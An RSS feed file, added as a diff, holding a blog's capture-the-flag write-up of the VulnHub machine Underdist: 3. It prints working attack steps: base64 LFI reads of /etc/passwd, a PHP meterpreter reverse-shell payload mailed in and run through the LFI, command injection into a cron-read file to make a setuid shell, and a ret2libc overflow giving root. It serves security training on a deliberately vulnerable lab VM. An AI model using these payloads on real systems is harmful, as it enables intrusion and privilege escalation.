@@ -1,0 +1,422 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Underdist on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/underdist/</link>
+    <description>Recent content in Underdist on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 03 Jan 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/underdist/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Underdist: 3</title>
+      <link>http://rastamouse.me/writeups/2015/underdist-3/</link>
+      <pubDate>Sat, 03 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/underdist-3/</guid>
+      <description>
+
+&lt;p&gt;Underdist: 3 was a weekend challenge being run by the &lt;a href=&#34;http://underc0de.org&#34;&gt;Underc0de&lt;/a&gt; group.  I didn&amp;rsquo;t take part in the event, but the VM found its way onto &lt;a href=&#34;https://www.vulnhub.com/entry/underdist-3,108/&#34;&gt;VulnHub&lt;/a&gt;.  On a quiet Saturday evening, I thought I&amp;rsquo;d give it a go (because that&amp;rsquo;s how rock-n-roll I am).&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ sudo nmap -n -sS -A -p- 192.168.56.103
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 a9:b1:ec:a1:b4:14:e9:56:0d:ff:b4:63:75:b4:a3:2c (DSA)
+|   2048 5e:ab:cd:93:1c:cb:16:86:71:2e:b3:b1:1f:57:c9:03 (RSA)
+|_  256 bb:87:6c:13:30:5b:22:19:65:5e:ca:f9:e9:4f:bb:0b (ECDSA)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: Underdist, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+| ssl-cert: Subject: commonName=Underdist
+| Not valid before: 2014-10-21T23:27:03+00:00
+|_Not valid after:  2024-10-18T23:27:03+00:00
+|_ssl-date: 2015-01-03T14:58:07+00:00; -2s from local time.
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The SSH service was out straight away, as only keys can be used to login.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ ssh 192.168.56.102
+Permission denied (publickey).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;local-file-inclusion:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Local File Inclusion&lt;/h2&gt;
+
+&lt;p&gt;Browsing to port 80, you see some cool ASCII art.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;__  __              __                   __               __                        __         __    
+/\ \/\ \            /\ \                 /\ \  __         /\ \__                   /&#39;__`\     /&#39;__`\  
+\ \ \ \ \    ___    \_\ \     __   _ __  \_\ \/\_\    ____\ \ ,_\                 /\_\L\ \   /\ \/\ \ 
+\ \ \ \ \ /&#39; _ `\  /&#39;_` \  /&#39;__`\/\`&#39;__\/&#39;_` \/\ \  /&#39;,__\\ \ \/       _______   \/_/_\_&amp;lt;_  \ \ \ \ \
+  \ \ \_\ \/\ \/\ \/\ \L\ \/\  __/\ \ \//\ \L\ \ \ \/\__, `\\ \ \_     /\______\    /\ \L\ \__\ \ \_\ \
+   \ \_____\ \_\ \_\ \___,_\ \____\\ \_\\ \___,_\ \_\/\____/ \ \__\    \/______/    \ \____/\_\\ \____/
+    \/_____/\/_/\/_/\/__,_ /\/____/ \/_/ \/__,_ /\/_/\/___/   \/__/                  \/___/\/_/ \/___/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But looking at the source code, you find the comment: &lt;code&gt;&amp;lt;!--&amp;lt;a href=&amp;quot;v.php?a=YXNjaWkxLnR4dA==&amp;quot;&amp;gt;foo&amp;lt;/a&amp;gt;--&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;If you browse to that URL, you see some 404 ASCII art.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;   _____  _______      _____ 
+  /  |  | \   _  \    /  |  |
+/   |  |_/  /_\  \  /   |  |_
+/    ^   /\  \_/   \/    ^   /
+\____   |  \_____  /\____   |
+     |__|        \/      |__|
+
+    
+               NOT FOUND.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The string &lt;code&gt;YXNjaWkxLnR4dA==&lt;/code&gt; looks very much like an encoded string, most likely base64.  You can decode this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ echo -en &#39;YXNjaWkxLnR4dA==&#39; | base64 -d
+ascii1.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This suggests that &lt;code&gt;v.php&lt;/code&gt; is including the file &lt;code&gt;ascii1.txt&lt;/code&gt;, maybe we can force it to include other files too?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ echo -en &#39;../../../../etc/passwd&#39; | base64
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+rasta@mouse:~$ curl http://192.168.56.103/v.php?a=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:104::/var/spool/exim4:/bin/false
+dovecot:x:102:106:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:103:65534:Dovecot login user,,,:/nonexistent:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+debian-spamd:x:105:107::/var/lib/spamassassin:/bin/sh
+underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
+postfix:x:106:109::/var/spool/postfix:/bin/false
+cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
+smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next stage is to leverage this LFI to read more files on the system, looking for a way in.  It&amp;rsquo;s a little bit cumbersome to manually encode the filename and then cURL it; so I wrote an &lt;code&gt;LFIshell&lt;/code&gt; script to automate it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+if [ &amp;quot;$#&amp;quot; -lt 1 ]; then
+        echo &amp;quot;Usage: $0 file&amp;quot;
+        exit 1
+fi
+
+curl=&#39;/usr/bin/curl&#39;
+url=&#39;http://192.168.56.103&#39;
+lfi=&#39;v.php?a=&#39;
+file=`echo -en ../../../..$1|/usr/bin/base64`
+
+curl $url/$lfi$file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My plan was to poison the apache access/error logs with PHP code, that I would be able to execute via the LFI.  However, they are not readable by the www-data user.&lt;/p&gt;
+
+&lt;p&gt;I eventually turned my attention to the SMTP service.  I took a list of users from &lt;code&gt;/etc/passwd&lt;/code&gt;, &lt;code&gt;cut -d &#39;:&#39; -f1 &amp;gt;&amp;gt; users&lt;/code&gt; and tried to enumerate valid users.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/vulnhub/underdist-3$ smtp-user-enum -t 192.168.56.102 -U users
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Every user came back as being valid, including &lt;code&gt;www-data&lt;/code&gt;.  I found I was able to email the &lt;code&gt;www-data&lt;/code&gt; user and read the content back via the LFI.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ nc 192.168.56.102 25
+220 Underdist ESMTP Postfix (Debian/GNU)
+HELO underdist
+250 Underdist
+MAIL from:rasta
+250 2.1.0 Ok
+RCPT to:www-data
+250 2.1.5 Ok
+data
+354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
+this is a test!
+.
+250 2.0.0 Ok: queued as 3B91F8535
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/vulnhub/underdist-3$ ./LFIshell.sh /var/mail/www-data
+
+From rasta@home.lan  Sat Jan  3 14:42:01 2015
+Return-Path: &amp;lt;rasta@home.lan&amp;gt;
+X-Original-To: www-data
+Delivered-To: www-data@home.lan
+Received: from underdist (unknown [192.168.56.101])
+     by Underdist (Postfix) with SMTP id 3B91F8535
+     for &amp;lt;www-data&amp;gt;; Sat,  3 Jan 2015 14:41:46 -0300 (ART)
+
+this is a test!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;php-shell:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;PHP Shell&lt;/h2&gt;
+
+&lt;p&gt;I was now able to email &lt;code&gt;www-data&lt;/code&gt; with PHP reverse shellcode and execute with the LFI.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw | base64 | tr -d &#39;\n&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wrote the exploit into a python script to automate the deployment.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import socket
+
+target = &#39;192.168.56.103&#39;
+port = 25
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+payload = &amp;quot;&amp;lt;?php eval(base64_decode(&#39;Izw/[...snip...]KTsK&#39;)); ?&amp;gt;&amp;quot;
+
+s.send(&#39;HELO underdist\r\n&#39;)
+s.send(&#39;MAIL from:rasta\r\n&#39;)
+s.send(&#39;RCPT to:www-data\r\n&#39;)
+s.send(&#39;data\r\n&#39;)
+s.send(payload + &#39;\r\n.\r\n&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~$ sudo msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 E
+
+[*] Started reverse handler on 192.168.56.101:4444
+[*] Starting the payload handler...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/vulnhub/underdist-3$ ./LFIshell.sh /var/mail/www-data
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Sending stage (40551 bytes) to 192.168.56.103
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.103:34683) at 2015-01-03 19:55:28 +0000
+
+meterpreter &amp;gt; sysinfo
+Computer    : Underdist
+OS          : Linux Underdist 3.2.0-4-486 #1 Debian 3.2.63-2 i686
+Meterpreter : php/php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;private-key:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Private Key&lt;/h2&gt;
+
+&lt;p&gt;Now that I had a shell on the system, I could browse the filesystem properly and straight away, I found a funny directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; pwd
+/var/www
+meterpreter &amp;gt; ls
+
+Listing: /var/www
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40755/rwxr-xr-x   4096  dir   2001-12-31 11:21:16 +0000  ascii
+40755/rwxr-xr-x   4096  dir   2001-12-31 12:17:57 +0000  b_gd214dg
+100644/rw-r--r--  1254  fil   2001-12-31 11:35:36 +0000  index.html
+100644/rw-r--r--  282   fil   2001-12-31 11:36:49 +0000  v.php
+
+meterpreter &amp;gt; ls b_gd214dg
+
+Listing: b_gd214dg
+==================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  1675  fil   2001-12-31 12:17:18 +0000  foo.backup
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The Meterpreter shell wasn&amp;rsquo;t fully functional, I couldn&amp;rsquo;t drop into a shell or download &lt;code&gt;foo.backup&lt;/code&gt;.  But since it&amp;rsquo;s available via apache, I used &lt;code&gt;wget&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This file turned out to be a private SSH key, which I was able to use with &lt;code&gt;cuervo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;rasta@mouse:~/vulnhub/underdist-3$ wget http://192.168.56.103/b_gd214dg/foo.backup -O foo.backup
+
+rasta@mouse:~/vulnhub/underdist-3$ file foo.backup
+foo.backup: PEM RSA private key
+
+rasta@mouse:~/vulnhub/underdist-3$ chmod 400 foo.backup 
+rasta@mouse:~/vulnhub/underdist-3$ ssh cuervo@192.168.56.103 -i foo.backup
+
+cuervo@Underdist:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;cronping:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Cronping&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;underdist&#39;s&lt;/code&gt; home directory is (partially) readable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cuervo@Underdist:~$ ls -l /home
+drwx------ 3 cuervo    cuervo    4096 oct 27 12:56 cuervo
+drwxr-xr-x 4 underdist underdist 4096 oct 27 11:55 underdist
+
+cuervo@Underdist:~$ ls -l /home/underdist/
+-rwxr-xr-x 1 underdist underdist 541 oct 27 11:46 cronping.py
+-rwxrwxrwx 1 underdist underdist  80 oct 27 13:12 ips.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the filename, we can infer that &lt;code&gt;cronping.py&lt;/code&gt; is periodically executed via a cronjob.  Because of the poor file permissions of the files, we can read them both and even modify &lt;code&gt;ips.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Reviewing &lt;code&gt;cronping.py&lt;/code&gt;, I saw that it reads in a list of IP address from &lt;code&gt;ips.txt&lt;/code&gt; and passes them into the &lt;code&gt;popen&lt;/code&gt; python function to ping the addresses.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;p=os.popen(&#39;ping -c 1 -w 1 %s|grep received|cut -d &amp;quot; &amp;quot; -f 4&#39; % (c), &amp;quot;r&amp;quot;)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;None of the input is sanitised, so &lt;code&gt;ips.txt&lt;/code&gt; can be modified to include arbitrary code exection in &lt;code&gt;popen&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I wrote &lt;code&gt;127.0.0.1;cp /bin/sh /tmp/sh; chmod 4777 /tmp/sh&lt;/code&gt; into &lt;code&gt;ips.txt&lt;/code&gt;, sat back and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cuervo@Underdist:/home/underdist$ ls -l /tmp/
+-rwsrwxrwx 1 underdist underdist 97284 ene  3 17:08 sh
+
+cuervo@Underdist:/home/underdist$ /tmp/sh
+$ whoami
+underdist
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I created &lt;code&gt;.ssh/authorzed_keys&lt;/code&gt; with my public key in &lt;code&gt;underdist&#39;s&lt;/code&gt; home directory for SSH access.&lt;/p&gt;
+
+&lt;h2 id=&#34;echo:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Echo&lt;/h2&gt;
+
+&lt;p&gt;Also within &lt;code&gt;/home/underdist&lt;/code&gt; is a &amp;lsquo;hidden&amp;rsquo; directory which can only be accessed by &lt;code&gt;underdist&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;drwx------ 2 underdist underdist 4096 oct 27 12:56 .bin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Within which, is a SUID binary owned by root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsr-xr-x 1 root      root      4986 oct 27 12:56 echo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;underdist@Underdist:~/.bin$ ./echo test
+test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running the binary through &lt;code&gt;strings&lt;/code&gt; shows that &lt;code&gt;strcpy&lt;/code&gt; is being used.  Maybe we can find an overflow to exploit&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;underdist@Underdist:~/.bin$ ./echo $(python -c &#39;print (&amp;quot;A&amp;quot; * 500)&#39;)
+AAAA[...snip...]AAAA
+Violación de segmento
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My Spanish isn&amp;rsquo;t too good, but think I understand that the binary segfaults :) and I confirmed that I could overwrite EIP.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) r $(python -c &#39;print (&amp;quot;A&amp;quot; * 500)&#39;)
+Starting program: /home/underdist/.bin/echo $(python -c &#39;print (&amp;quot;A&amp;quot; * 500)&#39;)
+AAAA[...snip...]AAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is next to no protection on the box or binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;underdist@Underdist:~/.bin$ cat /proc/sys/kernel/randomize_va_space
+0
+
+underdist@Underdist:~/.bin$ ./checksec.sh --file echo
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   echo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ret2libc:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;ret2libc&lt;/h2&gt;
+
+&lt;p&gt;Even though there&amp;rsquo;s no NX (allowing one to include shellcode directly in the exploit), I find the ret2libc technique easier and quicker to get working.&lt;/p&gt;
+
+&lt;p&gt;First, determine the offset to overwrite EIP.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;0x6b41316b
+[*] Exact match at offset 304
+
+(gdb) r $(python -c &#39;print (&amp;quot;A&amp;quot; * 304 + &amp;quot;B&amp;quot; * 4)&#39;)
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ec56b0 &amp;lt;system&amp;gt;
+$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7eb8f80 &amp;lt;exit&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The structure of my exploit shall be: &lt;code&gt;Padding + system() + exit() + /bin/sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;For the padding, I&amp;rsquo;ll use &lt;code&gt;NOPs&lt;/code&gt; (304 to write up to EIP) and &lt;code&gt;EIP&lt;/code&gt; will be overwritten with the address for &lt;code&gt;system()&lt;/code&gt;.  System() needs two arguments: an &lt;code&gt;exit&lt;/code&gt; address (you don&amp;rsquo;t need a real address for this, you can just fill it with junk) and an address which contains the string of whatever you want to execute (I want &lt;code&gt;/bin/sh&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ll put the string &lt;code&gt;/bin/sh&lt;/code&gt; into an environmental variable and obtain it&amp;rsquo;s address in memory using this C program.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int main(int argc, char *argv[])
+{
+	if(!argv[1])
+		exit(1);
+	printf(&amp;quot;%#x\n&amp;quot;, getenv(argv[1]));
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;underdist@Underdist:~/.bin$ export binsh=/bin/sh
+underdist@Underdist:~/.bin$ ./addr binsh
+0xbffff954
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I can piece my exploit together.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;underdist@Underdist:~/.bin$ ./echo $(python -c &#39;print (&amp;quot;\x90&amp;quot; * 304) + &amp;quot;\xb0\x56\xec\xb7&amp;quot; + &amp;quot;\x80\x8f\xeb\xb7&amp;quot; + &amp;quot;\x54\xf9\xff\xbf&amp;quot;&#39;)
+# id; whoami
+uid=1000(underdist) gid=1000(underdist) euid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(underdist)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:69270f6e9a12eebdce6e7f610e03857c&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+
+                        (`.         ,-,
+                        ` `.    ,;&#39; /
+                         `.  ,&#39;/ .&#39;
+                          `. X /.&#39;
+                .-;--&#39;&#39;--.._` ` (
+              .&#39;            /   `
+             ,           ` &#39;   Q &#39;
+             ,         ,   `._    \
+          ,.|         &#39;     `-.;_&#39;
+          :  . `  ;    `  ` --,.._;
+           &#39; `    ,   )   .&#39;
+              `._ ,  &#39;   /_
+                 ; ,&#39;&#39;-,;&#39; ``-
+                  ``-..__``--`
+
+              
+               http://underc0de.org
+    
+
+
+Felicidades H4x0r! resolviste el reto!
+
+Mandame tu solucionario a: a.denegado@gmail.com
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
